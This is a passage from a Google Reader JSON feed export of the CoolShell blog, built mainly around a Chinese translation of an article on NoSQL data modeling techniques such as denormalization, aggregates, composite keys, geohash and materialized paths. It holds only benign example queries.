href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7829.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7425.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2012/07/11/34898000.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">28个Unix/Linux的命令行神器</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Unix 40年：Unix年鉴\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1032.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7425.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/04/23/6281985.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Unix 40年：Unix年鉴</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Linux/Unix 新手和专家教程\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1042.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7425.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10437737.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Linux/Unix 新手和专家教程</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Unix 40年：昨天，今天和明天 \" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1023.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7425.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10437733.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Unix 40年：昨天，今天和明天 </font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"高级Unix命令\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1044.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7425.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">高级Unix命令</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2012年07月11日 -- <a href=\"http://coolshell.cn/articles/7829.html\" title=\"28个Unix/Linux的命令行神器\">28个Unix/Linux的命令行神器</a></li><li>2012年06月30日 -- <a href=\"http://coolshell.cn/articles/7804.html\" title=\"关于闰秒\">关于闰秒</a></li><li>2012年06月29日 -- <a href=\"http://coolshell.cn/articles/7779.html\" title=\"K-Means 算法\">K-Means 算法</a></li><li>2012年06月24日 -- <a href=\"http://coolshell.cn/articles/7755.html\" title=\"Git显示漂亮日志的小技巧\">Git显示漂亮日志的小技巧</a></li><li>2012年06月20日 -- <a href=\"http://coolshell.cn/articles/7490.html\" title=\"性能调优攻略\">性能调优攻略</a></li><li>2012年05月22日 -- <a href=\"http://coolshell.cn/articles/7459.html\" title=\"Huffman 编码压缩算法\">Huffman 编码压缩算法</a></li><li>2011年11月29日 -- <a href=\"http://coolshell.cn/articles/6010.html\" title=\"一些有意思的算法代码\">一些有意思的算法代码</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1337052796028",
    "timestampUsec" : "1337052796028486",
    "id" : "tag:google.com,2005:reader/item/4c550dbc1d0eb6c4",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "数据库", "Database", "NoSQL", "SQL" ],
    "title" : "NoSQL 数据建模技术",
    "published" : 1337041333,
    "updated" : 1337041333,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7270.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>全文译自墙外文章“<a href=\"http://highlyscalable.wordpress.com/2012/03/01/nosql-data-modeling-techniques/\">NoSQL Data Modeling Techniques</a>”，译得不好，还请见谅。这篇文章看完之后，你可能会对NoSQL的数据结构会有些感觉。我的感觉是，关系型数据库想把一致性，完整性，索引，CRUD都干好，NoSQL只干某一种事，但是牺牲了很多别的东西。总体来说，我觉得NoSQL更适合做Cache。下面是正文——</p>\n<p>NoSQL 数据库经常被用作很多非功能性的地方，如，扩展性，性能和一致性的地方。这些NoSQL的特性在理论和实践中都正在被大众广泛地研究着，研究的热点正是那些和性能分布式相关的非功能性的东西，我们都知道 <a href=\"http://en.wikipedia.org/wiki/CAP_theorem\">CAP 理论</a>被很好地应用于了 NoSQL 系统中（陈皓注：CAP即，一致性(Consistency)， 可用性(Availability)， 分区容忍性(Partition tolerance)，在分布式系统中，这三个要素最多只能同时实现两个，而NoSQL一般放弃的是一致性）。但在另一方面，NoSQL的数据建模技术却因为缺乏像关系型数据库那样的基础理论没有被世人很好地研究。这篇文章从数据建模方面对NoSQL家族进行了比较，并讨论几个常见的数据建模技术。</p>\n<p>要开始讨论数据建模技术，我们不得不或多或少地先系统地看一下NoSQL数据模型的成长的趋势，以此我们可以了解一些他们内在的联系。下图是NoSQL家族的进化图，我们可以看到这样的进化：Key-Value时代，BigTable时代，Document时代，全文搜索时代，和Graph数据库时代：（陈皓注：注意图中SQL说的那句话，NoSQL再这样发展下去就是SQL了，哈哈。）</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/overview2.png\"><img title=\"overview\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/overview2.png?w=594&amp;h=699\" alt=\"\" width=\"594\" height=\"699\"><br>\n</a>NoSQL Data Models</p>\n</div>\n<p>首先，我们需要注意的是SQL和关系型数据模型已存在了很长的时间，这种面向用户的自然性意味着：</p>\n<p><span></span></p>\n<ul>\n<li>最终用户一般更感兴趣于数据的聚合显示，而不是分离的数据，这主要通过SQL来完成。</li>\n<li>我们无法通过人手工控制数据的并发性，完整性，一致性，或是数据类型校验这些东西的。这就是为什么SQL需要在事务，二维表结构（schema）和外表联合上做很多事。</li>\n</ul>\n<p>另一方面，SQL可以让软件应用程序在很多情况下不需要关心数据库的数据聚合，和数据完整性和有效性进行控制。而如果我们去除了数据一致性，完整性这些东西，会对性能和分布存储有着重的帮助。正因为如此，我们才有数据模型的进化：</p>\n<ul>\n<li><strong>Key-Value 键值对存储</strong>是非常简单而强大的。下面的很多技术基本上都是基于这个技术开始发展的。但是，Key-Value有一个非常致命的问题，那就是如果我们需要查找一段范围内的key。（陈皓注：学过hash-table数据结构的人都应该知道，hash-table是非序列容器，其并不像数组，链接，队列这些有序容器，我们可以控制数据存储的顺序）。于是，有序键值 （Ordered Key-Value） 数据模型被设计出来解决这一限制，来从根本上提高数据集的问题。</li>\n</ul>\n<ul>\n<li><strong>Ordered Key-Value 有序键值</strong>模型也非常强大，但是，其也没有对Value提供某种数据模型。通常来说，Value的模型可以由应用负责解析和存取。这种很不方便，于是出现了 BigTable类型的数据库，这个数据模型其实就是map里有map，map里再套map，一层一层套下去，也就是层层嵌套的key-value（value里又是一个key-value），这种数据库的Value主要通过“列族”（column families），列，和时间戳来控制版本。（陈皓注：关于时间戳来对数据的版本控制主要是解决数据存储并发问题，也就是所谓的乐观锁，详见《<a title=\"多版本并发控制(MVCC)在分布式系统中的应用\" href=\"http://coolshell.cn/articles/6790.html\">多版本并发控制(MVCC)在分布式系统中的应用</a>》）</li>\n</ul>\n<ul>\n<li><strong>Document databases 文档数据库</strong> 改进了 BigTable 模型，并提供了两个有意义的改善。第一个是允许Value中有主观的模式（scheme），而不是map套map。第二个是索引。 <strong>Full Text Search Engines 全文搜索引擎</strong>可以被看作是文档数据库的一个变种，他们可以提供灵活的可变的数据模式（scheme）以及自动索引。他们之间的不同点主要是，文档数据库用字段名做索引，而全文搜索引擎用字段值做索引。</li>\n</ul>\n<ul>\n<li><strong>Graph data models 图式数据库</strong> 可以被认为是这个进化过程中从 Ordered Key-Value 数据库发展过来的一个分支。图式数据库允许构建议图结构的数据模型。它和文档数据库有关系的原因是，它的很多实现允许value可以是一个map或是一个document。</li>\n</ul>\n<h4> NoSQL 数据模型摘要</h4>\n<p>本文剩下的章节将向你介绍数据建模的技术实现和相关模式。但是，在介绍这些技术之前，先来一段序言：</p>\n<ul>\n<li>NoSQL 数据模型设计一般从业务应用的具体数据查询入手，而不是数据间的关系：</li>\n<ul>\n<li>关系型的数据模型基本上是分析数据间的结构和关系。其设计理念是： ”<strong>What answers do I have?”</strong><em> </em></li>\n<li>NoSQL 数据模型基本上是从应用对数据的存取方式入手，如：我需要支持某种数据查询。其设计理念是<strong> ”What questions do I have?”</strong></li>\n</ul>\n</ul>\n<ul>\n<li>NoSQL 数据模型设计比关系型数据库需要对数据结构和算法的更深的了解。在这篇文章中我会和大家说那些尽人皆知的数据结构，这些数据结构并不只是被NoSQL使用，但是对于NoSQL的数据模型却非常有帮助。</li>\n</ul>\n<ul>\n<li>数据冗余和反规格化是一等公民。</li>\n</ul>\n<ul>\n<li>关系型数据库对于处理层级数据和图式数据非常的不方便。NoSQL用来解决图式数据明显是一个非常好的解决方案，几乎所有的NoSQL数据库可以很强地解决此类问题。这就是为什么这篇文章专门拿出一章来说明层级数据模型。</li>\n</ul>\n<div>下面是NoSQL的分类表，也是我用来写这篇文章时做实践的产品：</div>\n<div>\n<ul>\n<li>Key-Value 存储: Oracle Coherence, Redis, Kyoto Cabinet</li>\n<li>类BigTable存储: Apache HBase, Apache Cassandra</li>\n<li>文档数据库: MongoDB, CouchDB</li>\n<li>全文索引: Apache Lucene, Apache Solr</li>\n<li>图数据库: neo4j, FlockDB</li>\n</ul>\n</div>\n<h4>概念技术 Conceptual Techniques</h4>\n<p>这一节主要介绍NoSQL数据模型的基本原则。</p>\n<h5>(1) 反规格化 Denormalization</h5>\n<p>反规格化 Denormalization 可以被认为是把相同的数据拷贝到不同的文档或是表中，这样就可以简化和优化查询，或是正好适合用户的某中特别的数据模型。这篇文章中所说的绝大多数技术都或多或少地导向了这一技术。</p>\n<p>总体来说，反规格化需要权衡下面这些东西：</p>\n<ul>\n<li><strong><em>查询数据量 /查询IO </em></strong> VS  <strong><em>总数据量</em></strong>。使用反规格化，一方面可以把一条查询语句所需要的所有数据组合起来放到一个地方存储。这意味着，其它不同不同查询所需要的相同的数据，需要放在别不同的地方。因此，这产生了很多冗余的数据，从而导致了数据量的增大。</li>\n</ul>\n<ul>\n<li><strong><em>处理复杂度 </em></strong> VS <strong><em>总数据量</em></strong>. 在符合范式的数据模式上进行表连接的查询，很显然会增加了查询处理的复杂度，尤其对于分布式系统来说更是。反规格化的数据模型允许我们以方便查询的方式来存构造数据结构以简化查询复杂度。</li>\n</ul>\n<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>\n<h5>(2) 聚合 Aggregates</h5>\n<p>所有类型的NoSQL数据库都会提供灵活的Schema（数据结构，对数据格式的限制）：</p>\n<ul>\n<li>Key-Value Stores 和 Graph Databases 基本上来说不会Value的形式，所以Value可以是任意格式。这样一来，这使得我们可以任意组合一个业务实体的keys。比如，我们有一个用户帐号的业务实体，其可以被如下这些key组合起来： <em>UserID_name, UserID_email, UserID_messages</em> 等等。如果一个用户没有email或message，那么相应也不会有这样的记录。</li>\n</ul>\n<ul>\n<li>BigTable 模型通过列集合来支持灵活的Schema，我们称之为列族（<em>column family</em>）。BigTable还可以在同一记录上出现不同的版本（通过时间戳）。</li>\n</ul>\n<ul>\n<li>Document databases 文档数据库是一种层级式的“去Schema”的存储，虽然有些这样的数据库允许检验需要保存的数据是否满足某种Schema。</li>\n</ul>\n<p>灵活的Schema允许你可以用一种嵌套式的内部数据方式来存储一组有关联的业务实体（陈皓注：类似于JSON这样的数据封装格式）。这样可以为我们带来两个好处。</p>\n<ul>\n<li>最小化“一对多”关系——可以通过嵌套式的方式来存储实体，这样可以少一些表联结。</li>\n</ul>\n<ul>\n<li>可以让内部技术上的数据存储更接近于业务实体，特别是那种混合式的业务实体。可能存于一个文档集或是一张表中。</li>\n</ul>\n<div>下图示意了这两种好处。图中描给了电子商务中的商品模型（陈皓注：我记得我在“<a title=\"挑战无处不在\" href=\"http://coolshell.cn/articles/7048.html\">挑战无处不在</a>”一文中说到过电商中产品分类数据库设计的挑战）</div>\n<div>\n<ul>\n<li>首先，所有的商品Product都会有一个ID，Price 和 Description。</li>\n</ul>\n<ul>\n<li>然后，我们可以知道不同的类型的商品会有不同的属性。比如，作者是书的属性，长度是牛仔裤的属性。其些属性可能是“一对多”或是“多对多”的关系，如：唱片中的曲目。</li>\n</ul>\n<ul>\n<li>接下来，我们知道，某些业务实体不可能使用固定的类型。如：牛仔裤的属性并不是所有的牌子都有的，而且，有些名牌还会搞非常特别的属性。</li>\n</ul>\n<p>对于关系型数据库来说，要设计这样的数据模型并不简单，而且设计出来的绝对离优雅很远很远。而我们NoSQL中灵活的Schema允许你使用一个聚合 Aggregate (product) 可以建出所有不同种类的商品和他们的不同的属性：</p>\n</div>\n<div>\n<div>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/soft-schema2.png\"><img title=\"soft-schema\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/soft-schema2.png?w=594&amp;h=439\" alt=\"\" width=\"594\" height=\"439\"></a></p>\n<p style=\"text-align:center\">Entity Aggregation</p>\n</div>\n</div>\n<div>\n<p>上图中我们可以比较关系型数据库和NoSQL的差别。<strong>但是我们可以看到在数据更新上，非规格化的数据存储在性能和一致性上会有很大的影响，这就是我们需要重点注意和不得不牺牲的地方</strong>。</p>\n</div>\n<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>\n<h5>(3) 应用层联结 Application Side Joins</h5>\n<p>表联结基本上不被NoSQL支持。正如我们前面所说的，NoSQL是“面向问题”而不是“面向答案”的，不支持表联结就是“面向问题”的后果。表的联结是在设计时被构造出来的，而不是在执行时建造出来的。所以，表联结在运行时是有很大开销的（陈皓注：搞过SQL表联结的都知道笛卡尔积是什么东西，大可以在参看以前酷壳的“<a title=\"图解SQL的Join\" href=\"http://coolshell.cn/articles/3463.html\">图解数据库表Joins</a>”），但是在使用了 Denormalization 和 Aggregates 技术后，我们基本不用进行表联结，如：你们使用嵌套式的数据实体。当然，如果你需要联结数据，你需要在应用层完成这个事。下面是几个主要的Use Case：</p>\n<ul>\n<li>多对多的数据实体关系——经常需要被连接或联结。</li>\n</ul>\n<ul>\n<li>聚合 Aggregates 并不适用于数据字段经常被改变的情况。对此，我们需要把那些经常被改变的字段分到另外的表中，而在查询时我们需要联结数据。例如，我们有个Message系统可以有一个User实体，其包括了一个内嵌的Message实体。但是，如果用户不断在附加 message，那么，最好把message拆分到另一个独立的实体，但在查询时联结这User和Message这两个实体。如下图：</li>\n</ul>\n<p><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/aggregates-joins.png\"><img title=\"aggregates-joins\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/aggregates-joins.png?w=594\" alt=\"\"></a></p>\n<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库， Graph Databases 图数据库。</p>\n<h4>通用建模技术 General Modeling Techniques</h4>\n<p>在本书中，我们将讨论NoSQL中各种不同的通用的数据建模技术。</p>\n<h5>(4) 原子聚合 Atomic Aggregates</h5>\n<p>很多NoSQL的数据库（并不是所有）在事务处理上都是短板。在某些情况下，他们可以通过分布式锁技术或是<a title=\"Implementation of MVCC Transactions for Key-Value Stores\" href=\"http://highlyscalable.wordpress.com/2012/01/07/mvcc-transactions-key-value/\">应用层管理的MVCC技术</a>来实现其事务性（陈皓注：可参看本站的“<a title=\"多版本并发控制(MVCC)在分布式系统中的应用\" href=\"http://coolshell.cn/articles/6790.html\">多版本并发控制(MVCC)在分布式系统中的应用</a>”）但是，通常来说只能使用聚合Aggregates技术来保证一些ACID原则。</p>\n<p>这就是为什么我们的关系型数据库需要有强大的事务处理机制——因为关系型数据库的数据是被规格化存放在了不同的地方。所以，Aggregates聚合允许我们把一个业务实体存成一个文档、存成一行，存成一个key-value，这样就可以原子式的更新了：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/atomic-aggregate1.png\"><img title=\"atomic-aggregate\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/atomic-aggregate1.png?w=594\" alt=\"\"><br>\n</a>Atomic Aggregates</p>\n</div>\n<p>当然，原子聚合 Atomic Aggregates 这种数据模型并不能实现完全意义上的事务处理，但是如果支持原子性，锁，或 test-and-set 指令，那么， Atomic Aggregates 是可以适用的。</p>\n<p><strong><strong>适用性</strong>: </strong>Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>\n<h5>(5) 可枚举键 Enumerable Keys</h5>\n<p>也许，对于无顺序的Key-Value最大的好处是业务实体可以被容易地hash以分区在多个服务器上。而排序了的key会把事情搞复杂，但是有些时候，一个应用能从排序key中获得很多好处，就算是数据库本身不提供这个功能。让我们来思考下email消息的数据模型：</p>\n<ol>\n<li>一些NoSQL的数据库提供原子计数器以允许生一些连续的ID。在这种情况下，我们可以使用 <em>userID_messageID</em> 来做为一个组合key。如果我们知道最新的message ID，就可以知道前一个message，也可能知道再前面和后面的Message。</li>\n<li>Messages可以被打包。比如，每天的邮件包。这样，我们就可以对邮件按指定的时间段来遍历。</li>\n</ol>\n<p><strong><strong><strong>适用性</strong>: </strong></strong>Key-Value Store 键值对数据库<strong>。</strong></p>\n<h5>(6) 降维 Dimensionality Reduction</h5>\n<p>Dimensionality Reduction 降维是一种技术可以允许把一个多维的数据映射成一个Key-Value或是其它非多给的数据模型。</p>\n<p>传统的地理位置信息系统使用一些如“四分树<a href=\"http://en.wikipedia.org/wiki/Quadtree\">QuadTree</a>” 或 “<a href=\"http://en.wikipedia.org/wiki/R-tree\">R-Tree</a>” 来做地理位置索引。这些数据结构的内容需要被在适当的位置更新，并且，如果数据量很大的话，操作成本会很高。另一个方法是我们可以遍历一个二维的数据结构并把其扁平化成一个列表。一个众所周知的例子是<a href=\"http://en.wikipedia.org/wiki/Geohash\">Geohash</a>（地理哈希）。一个Geohash使用“之字形”的路线扫描一个2维的空间，而且遍历中的移动可以被简单地用0和1来表示其方向，然后在移动的过程中产生0/1串。下图展示了这一算法：（陈皓注：先把地图分成四份，经度为第一位，纬度为第二位，于是左边的经度是0，右边的是1，纬度也一样，上面是为1，下面的为0，这样，经纬度就可以组合成01，11，00，10这四个值，其标识了四块区域，我们可以如此不断的递归地对每个区域进行四分，然后可以得到一串1和0组成的字串，然后使用0-9，b-z 去掉（去掉a, i, l, o）这32个字母进行base32编码得到一个8个长度的编码，这就是Geohash的算法）</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/geohash-traversal1.png\"><img title=\"geohash-traversal\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/geohash-traversal1.png?w=594\" alt=\"\"><br>\n</a>Geohash Index</p>\n</div>\n<p>Geohash的最强大的功能是使用简单的位操作就可以知道两个区域间的距离，就像图中所示（陈皓：proximity框着的那两个，这个很像IP地址了）。Geohash把一个二维的坐标生生地变成了一个一维的数据模型，这就是降维技术。BigTable的降维技术参看到文章后面的 [6.1]。更多的关于Geohash和其它技术可以参看 [6.2] 和 [6.3]。</p>\n<p><strong><strong><strong>适用性</strong>:</strong></strong> Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>\n<h5>(7) 索引表 Index Table</h5>\n<p>Index Table 索引表是一个非常直白的技术，其可以你在不支持索引的数据库中得到索引的好处。BigTable是这类最重要的数据库。这需要我们维护一个有相应存取模式的特别表。例如，我们有一个主表存着用户帐号，其可以被UserID存取。某查询需要查出某个城市里所有的用户，于是我们可以加入一张表，这张表用城市做主键，所有和这个城市相关的UserID是其Value，如下所示：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/index-table.png\"><img title=\"index-table\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/index-table.png?w=594\" alt=\"\"><br>\n</a>Index Table Example</p>\n</div>\n<p>可见，城市索引表的需要和对主表用户表保持一致性，因此，主表的每一个更新可能需要对索引表进行更新，不然就是一个批处理更新。无论哪个方式，这都会损伤一些性能，因为需要保持一致性。</p>\n<p>Index Table 索引表可以被认为是关系型数据库中的视图的等价物。</p>\n<p><strong>适用性</strong>: BigTable 数据库。</p>\n<h5>(8) 键组合索引 Composite Key Index</h5>\n<p>Composite key 键组合是一个很常用的技术，对此，当我们的数据库支持键排序时能得到极大的好处。Composite key组合键的拼接成为第二排序字段可以让你构建出一种多维索引，这很像我们之前说过的 Dimensionality Reduction 降维技术。例如，我们需要存取用户统计。如果我们需要根据不同的地区来统计用户的分布情况，我们可以把Key设计成这样的格式 <em>(State:City:UserID)</em>，这样一来，就使得我们可以通过State到City来按组遍历用户，特别是我们的NoSQL数据库支持在key上按区查询（如：BigTable类的系统）：</p>\n<pre>SELECT Values WHERE state=&quot;CA:*&quot;\nSELECT Values WHERE city=&quot;CA:San Francisco*&quot;</pre>\n<div>\n<p style=\"text-align:center\"><a href=\"http://highlyscalable.files.wordpress.com/2012/03/composite-key-index.png\"><img title=\"composite-key-index\" src=\"http://highlyscalable.files.wordpress.com/2012/03/composite-key-index.png?w=594\" alt=\"\"><br>\n</a>Composite Key Index</p>\n</div>\n<p><strong><strong>适用性</strong>: </strong>BigTable 数据库。</p>\n<h5>(9) 键组合聚合 Aggregation with Composite Keys</h5>\n<p>Composite keys  键组合技术并不仅仅可以用来做索引，同样可以用来区分不用的类型的数据以支持数据分组。考虑一个例子，我们有一个海量的日志数组，这个日志记录了互联网上的用户的访问来源。我们需要计算从某一网站过来的独立访客的数量，在关系型数据库中，我们可能需要下面这样的SQL查询语句：</p>\n<pre>SELECT count(distinct(user_id)) FROM clicks GROUP BY site</pre>\n<p>我们可以在NoSQL中建立如下的数据模型：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/composite-key-collating1.png\"><img title=\"composite-key-collating\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/composite-key-collating1.png?w=594\" alt=\"\"><br>\n</a>Counting Unique Users using Composite Keys</p>\n</div>\n<p>这样，我们就可以把数据按UserID来排序，我们就可以很容易把同一个用户的数据（一个用户并不会产生太多的event）进行处理，去掉那些重复的站点（使用hash table或是别的什么）。另一个可选的技术是，我们可以对每一个用户建立一个数据实体，然后把其站点来源追加到这个数据实体中，当然，这样一来，数据的更新在性能相比之下会有一定损失。</p>\n<p><strong><strong>适用性</strong>:</strong> Ordered Key-Value Store 排序键值对数据库， BigTable风格的数据库。</p>\n<p><strong><br>\n</strong></p>\n<h5>(10) 反转搜索 Inverted Search – 直接聚合 Direct Aggregation</h5>\n<p>这个技术更多的是数据处理技术，而不是数据建模技术。尽管如此，这个技术还是会影响数据模型。这个技术最主要的想法是使用一个索引来找到满足某条件的数据，但是把数据聚合起需要使用全文搜索。还是让我们来说一个示例。还是用上面那个例子，我们有很多的日志，其中包括互联网用户和他们的访问来源。让我们假定每条记录都有一个UserID，还有用户的种类 (Men, Women, Bloggers, 等)，以及用户所在的城市，和访问过的站点。我们要干的事是，为每个用户种类找到满足某些条件（访问源，所在城市，等）的的独立用户。</p>\n<p>很明显，我们需要搜索那些满足条件的用户，如果我们使用反转搜索，这会让我们把这事干得很容易，如： <em>{Category -&gt; [user IDs]}</em> 或 <em>{Site -&gt; [user IDs]}</em>。使用这样的索引， 我们可以取两个或多个UserID要的交集或并集（这个事很容易干，而且可以干得很快，如果这些UserID是排好序的）。但是，我们要按用户种类来生成报表会变得有点麻烦，因为我们用语句可能会像下面这样</p>\n<pre>SELECT count(distinct(user_id)) ... GROUP BY category</pre>\n<p>但这样的SQL很没有效率，因为category数据太多了。为了应对这个问题，我们可以建立一个直接索引 <em>{UserID -&gt; [Categories]}</em> 然后我们用它来生成报表：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/invert-direct1.png\"><img title=\"invert-direct\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/invert-direct1.png?w=594&amp;h=438\" alt=\"\" width=\"594\" height=\"438\"><br>\n</a>Counting Unique Users using Inverse and Direct Indexes</p>\n</div>\n<p>最后，我们需要明白，对每个UserID的随机查询是很没有效率的。我们可以通过批查询处理来解决这个问题。这意味着，对于一些用户集，我们可以进行预处理（不同的查询条件）。</p>\n<p><strong>适用性</strong>: Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。</p>\n<h4>层级式模型 Hierarchy Modeling Techniques</h4>\n<h5>(11) 树形聚合Tree Aggregation</h5>\n<p>树形或是任意的图（需反规格化）可以被直接打成一条记录或文档存放。</p>\n<ul>\n<li>当树形结构被一次性取出时这会非常有效率（如：我们需要展示一个blog的树形评论）</li>\n<li>搜索和任何存取这个实体都会存在问题。</li>\n<li>对于大多数NoSQL的实现来说，更新数据都是很不经济的（相比起独立结点来说）</li>\n</ul>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/tree-aggregation.png\"><img title=\"tree-aggregation\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/tree-aggregation.png?w=594\" alt=\"\"><br>\n</a>Tree Aggregation</p>\n</div>\n<p><strong>适用性</strong>: Key-Value 键值对数据库, Document Databases 文档数据库</p>\n<h5>(12) 邻接列表 Adjacency Lists</h5>\n<p>Adjacency Lists 邻接列表是一种图 – 每一个结点都是一个独立的记录，其包含了 所有的父结点或子结点。这样，我们就可以通过给定的父或子结点来进行搜索。当然，我们需要通过hop查询遍历图。这个技术在广度和深度查询，以及得到某个结点的子树上没有效率。</p>\n<p><strong>适用性</strong>: Key-Value 键值对数据库, Document Databases 文档数据库</p>\n<p><strong><br>\n</strong></p>\n<h5>(13) Materialized Paths</h5>\n<p>Materialized Paths 可以帮助避免递归遍历（如：树形结构）。这个技术也可以被认为是反规格化的一种变种。其想法是为每个结点加上父结点或子结点的标识属性，这样就可以不需要遍历就知道所有的后裔结点和祖先结点了：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/materialized-paths2.png\"><img title=\"materialized-paths\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/materialized-paths2.png?w=594\" alt=\"\"><br>\n</a>Materialized Paths for eShop Category Hierarchy</p>\n</div>\n<p>这个技术对于全文搜索引擎来说非常有帮助，因为其可以允许把一个层级结构转成一个文档。上面的示图中我们可以看到所有的商品或<em>Men’s Shoes</em>下的子分类可以被一条很短的查询语句处理——只需要给定个分类名。</p>\n<p>Materialized Paths 可以存储一个ID的集合，或是一堆ID拼出的字符串。后者允许你通过一个正则表达式来搜索一个特定的分支路径。下图展示了这个技术（分支的路径包括了结点本身）：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/materialized-paths-2.png\"><img title=\"materialized-paths-2\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/materialized-paths-2.png?w=594\" alt=\"\"><br>\n</a>Query Materialized Paths using RegExp</p>\n</div>\n<p><strong>适用性</strong>: Key-Value 键值对数据库, Document Databases 